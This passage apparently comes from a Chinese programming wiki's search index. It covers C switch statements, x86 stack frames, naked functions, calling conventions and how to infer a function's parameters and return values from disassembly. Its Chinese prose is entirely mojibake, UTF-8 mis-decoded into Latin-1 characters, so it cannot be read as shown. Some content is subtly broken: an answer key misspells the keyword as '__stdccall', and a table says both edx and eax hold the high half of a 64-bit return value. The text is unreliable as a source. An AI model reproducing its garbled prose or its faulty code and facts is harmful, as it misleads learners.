&quot;)ï¼Œå› ä¸ºæ²¡æœ‰breakï¼Œæ¥ç€å¾€ä¸‹èµ°ï¼Œæ‰§è¡Œprintf(&quot;D &quot;)ã€‚ç¢°åˆ°breakäº†ï¼Œè·³å‡ºswitchè¯­å¥å—ã€‚ 1234567891011121314151617181920int x = 2;switch (x)&#123; case 1: printf(&quot;A &quot;); break; case 2: printf(&quot;B &quot;); //break; case 3: printf(&quot;C &quot;); //break; case 4: printf(&quot;D &quot;); break; default: printf(&quot;default &quot;); break;&#125; æ¡ä»¶åˆå¹¶ æ˜¯1æ˜¯2ï¼Œåšçš„äº‹ä¸€æ ·ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š 1234567891011121314151617181920int x = 3;switch (x)&#123; case 1: case 2: printf(&quot;A &quot;); break; case 3: printf(&quot;C &quot;); // break; case 4: printf(&quot;D &quot;); break; default: printf(&quot;default &quot;); break;&#125;return 0; default defaultæ˜¯æ‰€æœ‰caseéƒ½ä¸æ»¡è¶³å°±æ‰§è¡Œã€‚ä¸€èˆ¬å†™åœ¨æœ€åæ˜¯å‡ºäºå¯è¯»æ€§çš„è€ƒè™‘ï¼Œä¹Ÿå¯ä»¥å†™åœ¨å‰è¾¹ï¼Œå®ƒä¸ä½ç½®æ— å…³ã€‚ä½†å½“defaultå†™åœ¨å…¶ä»–æ¡ä»¶çš„å‰é¢æ—¶ï¼Œå¦‚æœæ²¡æœ‰breakï¼Œè¿˜æ˜¯ä¼šå‘ä¸‹ç»§ç»­æ‰§è¡Œ å’Œifâ€¦elseè¯­å¥çš„åŒºåˆ« switchè¯­å¥åªèƒ½è¿›è¡Œç­‰å€¼åˆ¤æ–­ï¼ˆä»…èƒ½æ”¯æŒå¸¸é‡è¡¨è¾¾å¼ï¼‰ï¼Œè€Œifâ€¦elseå¯ä»¥è¿›è¡ŒåŒºé—´åˆ¤æ–­ï¼ˆè¡¨è¾¾å¼ã€å¸¸é‡â€¦éƒ½å¯ä»¥ï¼‰ switchè¯­å¥çš„æ‰§è¡Œæ•ˆç‡è¿œè¿œé«˜äºifâ€¦elseï¼Œåœ¨åˆ†æ”¯æ¡ä»¶æ¯”è¾ƒå¤šçš„æƒ…å†µä¸‹ï¼Œè¿™ç§è¶‹åŠ¿æ„ˆå‘æ˜æ˜¾ ç”¨é€” åœ¨æ¸¸æˆä¸­ï¼Œæ¯”å¦‚å¿«æ·é”®æ“ä½œï¼ŒF1æ‰“åï¼ŒF2åŠ çº¢ï¼ŒF3åŠ è“ï¼ŒF4é‡Šæ”¾æŠ€èƒ½ã€‚å‡è®¾è¿™äº›å¿«æ·é”®éƒ½å¯¹åº”ä¸€ä¸ªå¸¸é‡ï¼Œåœ¨æ¸¸æˆä¸­ï¼Œå› ä¸ºswitchçš„é«˜æ•ˆï¼Œä¼šç”¨switchè¯­å¥æ¥å¯¹åº”å¿«æ·é”®ä¸‹çš„call 1234567891011121314151617181920F1 F2 F3 F4 F5 F6 F7 F8 0 1 2 3 4 5 6 7 switch(è¡¨è¾¾å¼) &#123; case 1: æ‰“å.... break; case 2: åŠ çº¢.... break; case 3: åŠ è“.... break; case 4: é‡Šæ”¾æŠ€èƒ½.... break; default: è¯­å¥; break;\t&#125;"},{"title":"å‡½æ•°","path":"/wiki/C/å‡½æ•°.html","content":"å‡½æ•°æ ¼å¼ Cè¯­è¨€ä¸­å‡½æ•°è¯­æ³•æ ¼å¼1234è¿”å›ç±»å‹ å‡½æ•°å(å‚æ•°åˆ—è¡¨)&#123;&#125; è¿”å›ç±»å‹ã€å‡½æ•°åä¸èƒ½çœç•¥ å‚æ•°åˆ—è¡¨å¯ä»¥çœç•¥ ä¾‹1234int plus(int x,int y)&#123; return 0;&#125; å‡½æ•°åã€å‚æ•°åçš„å‘½åè§„åˆ™: åªèƒ½ä»¥å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç»„æˆï¼Œä¸”ç¬¬ä¸€ä¸ªå­—æ¯å¿…é¡»æ˜¯å­—æ¯æˆ–ä¸‹åˆ’çº¿ åŒºåˆ†å¤§å°å†™ ä¸èƒ½ä½¿ç”¨Cè¯­è¨€çš„å…³é“¾å­— å‡½æ•°è°ƒç”¨è¯­æ³• æ±‡ç¼–çœ¼ä¸­çš„å‡½æ•°è°ƒç”¨ è°ƒç”¨å½¢å¼1123push å‚æ•°1push å‚æ•°2call å†…å­˜åœ°å€ è°ƒç”¨å½¢å¼2123mov ecx,å‚æ•°1mov edx,å‚æ•°2call å†…å­˜åœ°å€ Cè¯­è¨€çœ¼ä¸­çš„å‡½æ•°è°ƒç”¨ 1å‡½æ•°å(å‚æ•°1,å‚æ•°2) æ€»ç»“:å‡½æ•°åå°±æ˜¯ç¼–è¯‘å™¨èµ·çš„å†…å­˜åœ°å€çš„åˆ«åã€‚ æ ˆå¸§ å †æ ˆå¸§(stack frame)(æˆ–æ´»åŠ¨è®°å½•ï¼ˆactivation record)ï¼‰æ˜¯ä¸€å—å †æ ˆä¿ç•™åŒºåŸŸï¼Œç”¨äºå­˜æ”¾è¢«ä¼ é€’çš„å®é™…å‚æ•°ã€å­ç¨‹åºçš„è¿”å›å€¼ã€å±€éƒ¨å˜é‡ä»¥åŠè¢«ä¿å­˜çš„å¯„å­˜å™¨ã€‚å½“Aå‡½æ•°å†…è°ƒç”¨Bå‡½æ•°æ—¶ï¼Œå°±ä¼šå¼€è¾Ÿè¢«è°ƒå‡½æ•°Bæ‰€éœ€çš„æ ˆç©ºé—´ï¼Œå½¢æˆå‡½æ•°Bçš„æ ˆå¸§ã€‚å½“å‡½æ•°Bè°ƒç”¨ç»“æŸæ—¶ï¼Œä¼šæ¸…é™¤å®ƒæ‰€ä½¿ç”¨çš„æ ˆç©ºé—´ï¼Œå…³é—­æ ˆå¸§ï¼Œè¿™ä¸€è¿‡ç¨‹ç§°ä¸ºæ ˆå¹³è¡¡ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå‡½æ•°Aæ˜¯ä¸»è°ƒå‡½æ•°calling functionï¼Œå‡½æ•°Bæ˜¯è¢«è°ƒå‡½æ•°called function x86_debugæ±‡ç¼–è§†è§’ä¸‹å‡½æ•°å›ºå®šçš„å¥—è·¯ å‡½æ•°çš„å†…å­˜å¸ƒå±€ å˜é‡ã€å‚æ•°ã€è¿”å›å€¼ç­‰çš„å†…å­˜å¸ƒå±€ EBP-4ä¹‹ä¸Šæ˜¯å±€éƒ¨å˜é‡åŒº EBPï¼šåŸEBPçš„å€¼ EBP+4ï¼šè¿”å›åœ°å€ EBP+8ä»¥ä¸‹ï¼šå‚æ•° ç»ƒä¹  ä½¿ç”¨è£¸å‡½æ•°å®ç°addå‡½æ•°ï¼Œä½“ä¼šCè¯­è¨€çš„å‡½æ•°æ˜¯å¦‚ä½•è½¬æ¢æˆæ±‡ç¼–è¯­è¨€çš„(å°±æ˜¯ä¸Šé¢è¯´çš„é‚£äº›æ±‡ç¼–æŒ‡ä»¤) 1234567int add(int x,int y,int z)&#123;\tint a=2;\tint b=3;\tint c=4;\treturn x+y+z+a+b+c;&#125; è£¸å‡½æ•°ä½¿ç”¨__declspec(naked)ä¿®é¥°å‡½æ•°åï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šæ›¿è¿™ä¸ªå‡½æ•°ç”Ÿæˆä»»ä½•æ±‡ç¼–æŒ‡ä»¤ï¼Œè¿retéƒ½è¦è‡ªå·±ä½¿ç”¨å†…è”æ±‡ç¼–æ˜¾å¼å†™å‡ºã€‚1234567__declspec(naked) int add(int a, int b) &#123;\t__asm\t&#123; ret\t&#125;&#125;å¦‚æœè¿retéƒ½ä¸å†™ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ä¼šå‡ºé”™ï¼Œå› ä¸ºèµ°åˆ°äº†int 3æ³¨æ„ï¼Œåªæ˜¯å‡½æ•°å†…éƒ¨ä»€ä¹ˆéƒ½ä¸ç”Ÿæˆï¼Œä½†æ˜¯callå‰åï¼Œå‹å‚ï¼Œå¤–å¹³æ ˆï¼ˆå¦‚æœæ˜¯å¤–å¹³æ ˆï¼‰ï¼Œè¿™äº›è¿˜æ˜¯æœ‰çš„ã€‚12345678910111213__declspec(naked) int add(int a, int b) &#123;\t__asm\t&#123; ret\t&#125;&#125;int main()&#123;\tadd(1,2);\treturn 0;&#125; ç­”æ¡ˆæ³¨æ„ï¼šè¶…è¿‡10ä»¥ä¸Šçš„ç«‹å³æ•°å‰é¢åŠ 0xï¼Œè¡¨ç¤ºåå…­è¿›åˆ¶ã€‚è¦ä¸ä¼šè¢«å½“æˆåè¿›åˆ¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;__declspec(naked) int add(int x,int y,int z)&#123;\t__asm\t&#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ss:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd mov dword ptr [ebp-4],2 mov dword ptr [ebp-8],3 mov dword ptr [ebp-0xC],4 mov eax,dword ptr [ebp+8] add eax,dword ptr [ebp+0xC] add eax,dword ptr [ebp+0x10] add eax,dword ptr [ebp-4] add eax,dword ptr [ebp-8] add eax,dword ptr [ebp-0xC] pop edi pop esi pop ebx mov esp,ebp pop ebp ret\t&#125;&#125;int main(void)&#123;\tint result=add(1,2,3);\tprintf(&quot;%d&quot;,result);\treturn 0;&#125; è°ƒç”¨çº¦å®š å‚è€ƒé“¾æ¥ğŸ”—ï¼šå…³äºè°ƒç”¨çº¦å®š(cdeclã€fastcallã€stcallã€thiscall) çš„ä¸€ç‚¹çŸ¥è¯† è°ƒç”¨çº¦å®šå°±æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨æ€ä¹ˆä¼ é€’å‚æ•°ï¼Œæ€ä¹ˆä¼ é€’è¿”å›å€¼ï¼Œæ€ä¹ˆå¹³è¡¡å †æ ˆã€‚ è¿™é‡Œåˆ—å‡ºå¸¸è§çš„è°ƒç”¨çº¦å®šï¼Œå…¶ä»–çš„æ¯”å¦‚nakedè£¸å‡½æ•°ï¼Œåœ¨ä¸Šé¢çš„ç»ƒä¹ é¢˜å·²åšè¡¥å……è¯´æ˜ã€‚å½“ç„¶ï¼Œè°ƒç”¨çº¦å®šè¿œä¸æ­¢è¿™å‡ ä¸ªï¼Œæœ‰æ—¶ä½ ä¼šå‘ç°ä»£ç å¤æ‚æ—¶ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„ä¸æ˜¯æˆ‘ä»¬è¿™é‡Œè®²çš„è¿™äº›è°ƒç”¨çº¦å®šï¼Œè¿™äº›è¦åœ¨å¹³æ—¶çš„ä»£ç åˆ†ææ—¶ç§¯ç´¯ç»éªŒã€‚ è°ƒç”¨çº¦å®š å‚æ•°ä¼ é€’æ–¹å¼ è°è´Ÿè´£å¹³æ ˆï¼Ÿ åœºæ™¯ cdecl ä»å³å‘å·¦å‹æ ˆ è°ƒç”¨è€…calling functionï¼Œå¤–å¹³æ ˆ C/C++ã€MFCçš„é»˜è®¤æ–¹å¼ï¼›å¯å˜å‚æ•°çš„å‡½æ•° stdcall ä»å³å‘å·¦å‹æ ˆ è¢«è°ƒæ–¹called functionï¼Œå†…å¹³æ ˆ windows apiè°ƒç”¨çº¦å®š fastcall å‡½æ•°ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªDWORDå‚æ•°é€šè¿‡ecxå’Œedxä¼ é€’ï¼Œå…¶ä½™å‚æ•°æŒ‰ä»å³å‘å·¦çš„é¡ºåºå‹æ ˆ å¦‚æœå‚æ•°è¶…è¿‡2ä¸ªï¼Œç”¨åˆ°å †æ ˆä¼ å‚äº†ï¼Œæ‰éœ€è¦å¹³æ ˆã€‚è¢«è°ƒæ–¹called functionï¼Œå†…å¹³æ ˆ é€Ÿåº¦å¿«ã€‚ä½†å¦‚æœå‚æ•°å¤šï¼Œä¹Ÿç”¨åˆ°å †æ ˆä¼ å‚ï¼Œå…¶å®ä¹ŸåŠ é€Ÿä¸äº†å¤šå°‘ thiscall ä»å³å‘å·¦å…¥æ ˆå¦‚æœå‚æ•°ä¸ªæ•°ç¡®å®š, thisæŒ‡é’ˆé€šè¿‡ecxä¼ é€’ç»™è¢«è°ƒç”¨è€…, å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®š, thisæŒ‡é’ˆåœ¨æ‰€æœ‰å‚æ•°å‹æ ˆåè¢«å‹å…¥å †æ ˆ å‚æ•°ä¸ªæ•°ä¸å®šçš„, è°ƒç”¨è€…calling functionæ¸…ç†å †æ ˆ ï¼Œå¤–å¹³æ ˆå‚æ•°ä¸ªæ•°ç¡®å®šçš„ï¼Œè¢«è°ƒæ–¹called functionï¼Œæ¸…ç†å †æ ˆï¼Œå†…å¹³æ ˆ æˆå‘˜ç¼ºçœè°ƒç”¨çº¦å®š O2é€‰é¡¹ä¼˜åŒ–æ—¶ï¼Œå¤–å¹³æ ˆçš„è°ƒç”¨æ–¹å¼å¯ä»¥é‡‡ç”¨å¤å†™ä¼ æ’­ä¼˜åŒ–ï¼Œæé«˜æ•ˆç‡ã€‚ ä»¥åŠ æ³•å‡½æ•°ä¸ºä¾‹ï¼Œçœ‹ä¸åŒå‡½æ•°è°ƒç”¨æ–¹å¼ä¸‹æ±‡ç¼–æŒ‡ä»¤çš„å·®å¼‚ cdeclè°ƒç”¨çº¦å®šstdcallè°ƒç”¨çº¦å®šfastcallè°ƒç”¨çº¦å®šthiscallè°ƒç”¨çº¦å®š123456789int add(int x,int y)\t//ä¸åŠ ä¿®é¥°é»˜è®¤å°±æ˜¯Cè°ƒç”¨çº¦å®š&#123;\treturn x+y;&#125;int __cdecl add(int x,int y)\t//æ˜ç¡®æŒ‡å®šç”¨Cè°ƒç”¨çº¦å®š&#123;\treturn x+y;&#125; 12345678910int add(int x,int y)&#123;\treturn x+y;&#125;int main(void)&#123;\tadd(1,2);\treturn 0;&#125; 12345678910int __stdcall add(int x,int y)&#123;\treturn x+y;&#125;int main(void)&#123;\tadd(1,2);\treturn 0;&#125; 12345678910int __fastcall add(int x,int y)&#123;\treturn x+y;&#125;int main(void)&#123;\tadd(1,2);\treturn 0;&#125; ä¸Šé¢è¿™ä¸ªä¸¤ä¸ªæ•°ç›¸åŠ çš„ä¾‹å­ï¼Œå› ä¸ºä¼ é€’å‚æ•°åªæœ‰2ä¸ªï¼Œéƒ½ç”¨äº†å¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°ï¼Œæ²¡ç”¨åˆ°å †æ ˆä¼ å‚ï¼Œæ‰€ä»¥ä¸éœ€è¦å¹³æ ˆã€‚ å¦‚æœæ˜¯4ä¸ªå‚æ•°ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°å†…å¹³æ ˆã€‚ 12345678910int __fastcall add(int x,int y,int z,int a)&#123;\treturn x+y+z+a;&#125;int main(void)&#123;\tadd(1,2,3,4);\treturn 0;&#125; å‚æ•°ä¸ªæ•°ç¡®å®šä¸å®šå‚æ•°ï¼ˆå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼‰thiscallæ˜¯å”¯ä¸€ä¸€ä¸ªä¸èƒ½æ˜ç¡®æŒ‡æ˜çš„å‡½æ•°ä¿®é¥°, å› ä¸ºthiscallä¸æ˜¯å…³é”®å­—. å®ƒæ˜¯C++ç±»æˆå‘˜å‡½æ•°ç¼ºçœçš„è°ƒç”¨çº¦å®šã€‚ 1234567891011121314151617struct A&#123; int x; int y; int add() &#123; return x + y; &#125;&#125;;int main(void)&#123; A a; int r = a.add(); return 0;&#125; 1234567891011121314151617181920212223242526272829#include &lt;cstdarg&gt;#include &lt;iostream&gt;class MyClass &#123;public: // æˆå‘˜å‡½æ•°ï¼Œè®¡ç®—ä¸å®šæ•°é‡å‚æ•°çš„å’Œ int sum(int count, ...) &#123; int result = 0; va_list args; va_start(args, count); // åˆå§‹åŒ–argsæŒ‡å‘ç¬¬ä¸€ä¸ªä¸å®šå‚æ•° for (int i = 0; i &lt; count; ++i) &#123; result += va_arg(args, int); // è·å–ä¸‹ä¸€ä¸ªintç±»å‹çš„å‚æ•° &#125; va_end(args); // æ¸…ç†args return result; &#125;&#125;;int main() &#123; MyClass obj; int result = obj.sum(4, 10, 20, 30, 40); // è°ƒç”¨sumå‡½æ•° std::cout &lt;&lt; &quot;The result is: &quot; &lt;&lt; result &lt;&lt; std::endl; // è¾“å‡ºç»“æœ return 0;&#125; ç»ƒä¹  å°†CallingConvention.exeé€†å‘æˆCè¯­è¨€ ç­”æ¡ˆ12345678910111213141516171819202122232425int __stdccall AddThreeNum(int num1,int num2,int num3)&#123;\treturn num1+num2+num3;&#125;int __cdecl AddTwoNum(int num1,int num2)&#123;\treturn num1+num2;&#125;int __fastcall func(int num1,int num2,int num3,int num4,int num5)&#123;\tint x=num1; //1\tint y=num2; //3\tint result1=AddThreeNum(num3,y,x); //8\tint result2=AddTwoNum(x,y); //4\treturn AddTwoNum(result1,result2); //12&#125;int main(int argc,char* argv[])&#123;\tint result=func(1,3,4,6,7);\tprintf(&quot;%d&quot;,result);\treturn 0;&#125;æ”¾åœ¨VC++6.0ä¸­æŸ¥çœ‹åæ±‡ç¼–ï¼Œå’Œexeåœ¨ODä¸­çš„æ±‡ç¼–è¿›è¡Œå¯¹æ¯”ã€‚é™¤äº†æœ‰ä¸€äº›åœ°æ–¹ä¸ä¸€æ ·ï¼Œå…¶ä½™éƒ½ä¸€æ ·ã€‚ä¸ä¸€æ ·çš„åœ°æ–¹ï¼šè°ƒç”¨AddThreeNumå‡½æ•°æ—¶çš„xå’Œyä¸æ˜¯ä»[EBP-4]å’Œ[EBP-8]å¤„å–ï¼Œç¼–è¯‘å™¨åœ¨ç»™xå’Œyèµ‹å€¼åï¼Œåˆè®©[ESP-C]=1,[ESP-0x10]=3ï¼Œä»è¿™ä¸¤ä¸ªåœ°æ–¹å–å‚æ•°ä¼ ç»™å‡½æ•°ã€‚ç„¶ååç»­çš„å˜é‡ä½ç½®ä»[ebp-0x14]å¼€å§‹å‘ä¸Šä½¿ç”¨ã€‚1234567891011121314151617181920212223242526272829303132333435363738394041424344004010A0 push ebp004010A1 mov ebp,esp004010A3 sub esp,58h004010A6 push ebx004010A7 push esi004010A8 push edi004010A9 push ecx004010AA lea edi,[ebp-58h]004010AD mov ecx,16h004010B2 mov eax,0CCCCCCCCh004010B7 rep stos dword ptr [edi]004010B9 pop ecx004010BA mov dword ptr [ebp-8],edx004010BD mov dword ptr [ebp-4],ecx18: int x=num1; //1+004010C0 mov eax,dword ptr [ebp-4]+004010C3 mov dword ptr [ebp-0Ch],eax19: int y=num2; //3+004010C6 mov ecx,dword ptr [ebp-8]+004010C9 mov dword ptr [ebp-10h],ecx20: int result1=AddThreeNum(num3,y,x); //8+004010CC mov edx,dword ptr [ebp-0Ch]004010CF push edx+004010D0 mov eax,dword ptr [ebp-10h]004010D3 push eax004010D4 mov ecx,dword ptr [ebp+8]004010D7 push ecx004010D8 call @ILT+15(AddThreeNum) (00401014)004010DD mov dword ptr [ebp-14h],eax21: int result2=AddTwoNum(x,y); //4+004010E0 mov edx,dword ptr [ebp-10h]004010E3 push edx+004010E4 mov eax,dword ptr [ebp-0Ch]004010E7 push eax004010E8 call @ILT+0(AddTwoNum) (00401005)004010ED add esp,8004010F0 mov dword ptr [ebp-18h],eax22: return AddTwoNum(result1,result2); //12004010F3 mov ecx,dword ptr [ebp-18h]004010F6 push ecx004010F7 mov edx,dword ptr [ebp-14h]004010FA push edx004010FB call @ILT+0(AddTwoNum) (00401005)00401100 add esp,8 å‡½æ•°å‚æ•°ä¸ªæ•°çš„åˆ†æ æ»´æ°´ä¸‰æœŸï¼ŒP19ï¼Œ2015-01-28ï¼Œ33:48-44:45 è¿™é‡Œè®²å¾—å¾ˆå¥½ï¼Œå¯ä»¥å¤šå¬ é€šè¿‡å‰é¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬åˆ¤æ–­å‡½æ•°å‚æ•°ä¸ªæ•°çš„ä¸€èˆ¬æƒ…å†µå¦‚ä¸‹ï¼š è§‚å¯Ÿè°ƒç”¨å¤„çš„ä»£ç  1234push 3push 2push 1call 0040100f ç»§ç»­è§‚å¯Ÿå¹³è¡¡å †æ ˆçš„ä»£ç  å¤–å¹³æ ˆ 12call 0040100fadd esp,0Ch å†…å¹³æ ˆ 1ret 4/8/0xC/0x10 ç»¼åˆä¸Šé¢ä¸¤æ­¥çš„è§‚å¯Ÿæƒ…å†µæ¥ç¡®å®šå‚æ•°ä¸ªæ•° é—®é¢˜ å‚æ•°ä¼ é€’æœªå¿…éƒ½æ˜¯é€šè¿‡å †æ ˆï¼Œè¿˜å¯èƒ½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ çš„ å‡½æ•°è°ƒç”¨å¤„çš„ä»£ç çœ‹ä¸åˆ°ï¼Œæ¯”å¦‚å¯èƒ½æ˜¯çº¿ç¨‹è°ƒçš„å›è°ƒå‡½æ•° çœ‹ä¸åˆ°è¿™å—ä»£ç  1234567push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call å‡½æ•°åœ°å€ é‚£æ€ä¹ˆåˆ†æï¼Ÿçœ‹å‡½æ•°å†…éƒ¨ã€‚ ä¸‹é¢è¯´æ˜åˆ†ææ­¥éª¤ï¼Œå‡è®¾çœ‹ä¸åˆ°è°ƒç”¨å¤„çš„ä»£ç ï¼Œåªæœ‰å¦‚ä¸‹çš„å‡½æ•°å†…éƒ¨ä»£ç ï¼š 12345678910111213141516171819202122232400401050 push ebp00401051 mov ebp,esp00401053 sub esp,48h00401056 push ebx00401057 push esi00401058 push edi00401059 push ecx0040105A lea edi,[ebp-48h]0040105D mov ecx,12h00401062 mov eax,0CCCCCCCCh00401067 rep stos dword ptr [edi]00401069 pop ecx0040106A mov dword ptr [ebp-8],edx0040106D mov dword ptr [ebp-4],ecx00401070 mov eax,dword ptr [ebp-4]00401073 add eax,dword ptr [ebp-8]00401076 add eax,dword ptr [ebp+8]00401079 mov [g_x (00427958)],eax0040107E pop edi0040107F pop esi00401080 pop ebx00401081 mov esp,ebp00401083 pop ebp00401084 ret 4 è§‚å¯Ÿæ­¥éª¤ï¼š ä¸è€ƒè™‘ebpã€espï¼Œåªæ‰¾ç»™åˆ«äººèµ‹å€¼çš„å¯„å­˜å™¨eax/ecx/edx/ebx/esi/edi æ‰¾åˆ°ä»¥åè¿½æŸ¥å…¶æ¥æºï¼Œå¦‚æœï¼Œè¯¥å¯„å­˜å™¨ä¸­çš„å€¼ä¸æ˜¯åœ¨å‡½æ•°å†…å­˜èµ‹å€¼çš„ï¼Œé‚£ä¸€å®šæ˜¯ä¼ è¿›æ¥çš„å‚æ•°ã€‚ å…¬å¼ä¸€ï¼šå¯„å­˜å™¨ + ret 4 = å‚æ•°ä¸ªæ•° å…¬å¼äºŒï¼šå¯„å­˜å™¨ + [ebp+8] +[ebp+0x] = å‚æ•°ä¸ªæ•° æ ˆå¸§å‰é¢è¿™æ®µçš„æŒ‡ä»¤å¥—è·¯ä¸æ˜¯ä¸€å®šçš„ï¼Œdebugæˆ–å‘å¸ƒç‰ˆä¼šæœ‰å·®å¼‚ã€‚ 12345678910111200401050 push ebp00401051 mov ebp,esp00401053 sub esp,48h00401056 push ebx00401057 push esi00401058 push edi00401059 push ecx0040105A lea edi,[ebp-48h]0040105D mov ecx,12h00401062 mov eax,0CCCCCCCCh00401067 rep stos dword ptr [edi]00401069 pop ecx å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°å‡½æ•°å†…éƒ¨ç”¨äº†edxå¯„å­˜å™¨ç»™åˆ«äººèµ‹å€¼ 10040106A mov dword ptr [ebp-8],edx ç„¶åä»è¿™è¡Œä»£ç å¾€ä¸Šçœ‹ï¼Œçœ‹å‰é¢çš„ä»£ç ï¼Œæ²¡çœ‹åˆ°åœ¨å‡½æ•°å†…éƒ¨æœ‰å¯¹edxæœ‰èµ‹å€¼ï¼Œé‚£ä¹ˆedxä¸€å®šæ˜¯ä¼ è¿›æ¥çš„å‚æ•°ã€‚ ecxåŒç†ã€‚ ç”±æ­¤ï¼Œç¡®å®šäº†ç”±å¯„å­˜å™¨ä¼ é€’çš„å‚æ•°ä¸ªæ•°ï¼Œæ˜¯2ä¸ªã€‚ç„¶åçœ‹å †æ ˆå¹³è¡¡æ“ä½œï¼Œçœ‹åˆ° 100401084 ret 4 æ‰€ä»¥å †æ ˆä¼ å‚ä¸ªæ•°æ˜¯1ä¸ªï¼ŒåŠ ä¸Šå¯„å­˜å™¨ä¼ å‚ï¼Œè¿™ä¸ªcallå‡½æ•°ä¸€å…±3ä¸ªå‚æ•°ã€‚ä¸è¿‡ï¼Œåœ¨çœ‹äº†å †æ ˆå¹³è¡¡æ“ä½œçš„å­—èŠ‚æ•°åï¼Œå¯ä»¥åœ¨ç»†è‡´ç‚¹ï¼Œçœ‹å‡½æ•°å†…éƒ¨ä½¿ç”¨åˆ°çš„å †æ ˆå‚æ•°[ebp+8]ã€[ebp+0x]æ¥åšäºŒæ¬¡ç¡®è®¤ã€‚ æ€»ç»“ æ ¹æ®pushä¸ªæ•°ï¼ˆçœ‹ä¸åˆ°ä¹Ÿæ²¡å…³ç³»ï¼‰ã€å¹³æ ˆæ“ä½œå¹³äº†å¤šå°‘å­—èŠ‚ï¼ˆæœ‰å¯èƒ½æ˜¯ç”¨ç­‰ä»·æŒ‡ä»¤å¹³æ ˆï¼‰ã€å‡½æ•°å†…éƒ¨ç”¨åˆ°äº†å“ªäº›å‚æ•°ï¼Œè¿™äº›å› ç´ ç»¼åˆåˆ¤æ–­ã€‚ é”™è¯¯çš„ï¼š callå‰æœ‰å‡ ä¸ªpushå¹¶ä¸è¯´æ˜è¿™ä¸ªå‡½æ•°å°±æ˜¯å‡ ä¸ªå‚æ•°ï¼Œå› ä¸ºç»è¿‡ç¼–è¯‘å™¨ä¼˜åŒ–åçš„ä»£ç å¯èƒ½å…ˆpushäº†ï¼Œä½†æ˜¯æ˜¯ä¸‹ä¸€ä¸ªcallæ‰ç”¨åˆ°ã€‚ å‡½æ•°çš„è¿”å›å€¼ åœ¨åŸºæœ¬æ•°æ®ç±»å‹ä¸sizeof(type)â‰¤4çš„è‡ªå®šä¹‰ç±»å‹ï¼ˆæµ®ç‚¹ç±»å‹é™¤å¤–ï¼‰æƒ…å†µä¸‹ï¼Œå¦‚æœå‡½æ•°æœ‰è¿”å›å€¼ï¼Œæ˜¯ç”¨eaxä½œä¸ºè¿”å›å€¼ã€‚å¦‚æœå¤§å°å¤§äº4å­—èŠ‚ï¼Œç”¨eaxå’Œedxæ¥ä¼ é€’è¿”å›å€¼ã€‚ å‡½æ•°è¿”å›ç±»å‹ å¦‚ä½•ä¼ é€’ char al short ax int eax å¤§å°ï¼4å­—èŠ‚ eaxå’Œedxã€‚edxå­˜å‚¨é«˜ä½ï¼Œeaxå­˜å‚¨é«˜ä½ é€†å‘ç»éªŒä¹‹è°ˆï¼šå•æ­¥æ­¥è¿‡ä¸€ä¸ªcallï¼Œè§‚å¯Ÿeaxå˜åŒ–ã€‚å¦‚æœeaxå˜äº†ï¼Œè¯´æ˜è¿™ä¸ªcallå°†ä¸€ä¸ªæ•°å­˜åˆ°eaxè¿”å›å‡ºæ¥ï¼Œç„¶åç´§æ¥ç€åˆ†æè¿™ä¸ªeaxå­˜çš„ä¸œè¥¿ä»£è¡¨ä»€ä¹ˆå«ä¹‰ charç±»å‹çš„è¿”å›å€¼shortç±»å‹çš„è¿”å›å€¼intç±»å‹çš„è¿”å›å€¼å¤§å°ï¼4å­—èŠ‚ç±»å‹çš„è¿”å›å€¼12345678910111213#include &lt;stdio.h&gt;char func()&#123; return 12;&#125;int main()&#123;\tchar result=func();\treturn 0;&#125; 12345678910111213#include &lt;stdio.h&gt;short func()&#123; return 12;&#125;int main()&#123;\tshort result=func();\treturn 0;&#125; 12è¿™ä¸ªå¸¸æ•°å°±åœ¨ç¡¬ç¼–ç ä¸­ï¼Œoffsetçš„æ“ä½œå°±æ˜¯æŠŠ0040103aè¿™ä¸ªåœ°å€çš„å€¼å–å‡ºï¼Œæ”¾å…¥axä¸­ 12345678910111213#include &lt;stdio.h&gt;int func()&#123; return 12;&#125;int main()&#123;\tint result=func();\treturn 0;&#125; ç”¨æ•°ç»„æˆ–ç»“æ„ä½“å°±èƒ½è‡ªå®šä¹‰å¤§å°çš„æ•°æ®ç±»å‹ã€‚è¿™é‡Œä»¥long longç±»å‹æ¼”ç¤ºå½“å­—èŠ‚æ•°&gt;4ï¼Œeaxå­˜ä¸ä¸‹æ—¶ï¼Œå‡½æ•°çš„è¿”å›å€¼æ˜¯å¦‚ä½•è¿”å›çš„ï¼Ÿ long longç±»å‹åœ¨VC6ä¸­å¯¹åº”çš„æ˜¯__int64 12345678910111213#include &quot;stdafx.h&quot;__int64 func()&#123; return 0x1234567890;&#125;int main()&#123;\t__int64 result=func();\treturn 0;&#125; é«˜ä½ï¼šedx ä½ä½ï¼šeax å±€éƒ¨å˜é‡ä¹Ÿæ˜¯ï¼Œç”¨edxå­˜é«˜ä½ï¼Œeaxå­˜ä½ä½ å‚æ•°ä¼ é€’ å‡½æ•°ä¼ é€’å‚æ•°æœ‰ä¸¤ç§æ–¹å¼ï¼šå †æ ˆå’Œå¯„å­˜å™¨ã€‚charå’Œshortç±»å‹è¿˜æ˜¯é€šè¿‡4å­—èŠ‚å¤§å°è¿›è¡Œä¼ å‚ã€‚ 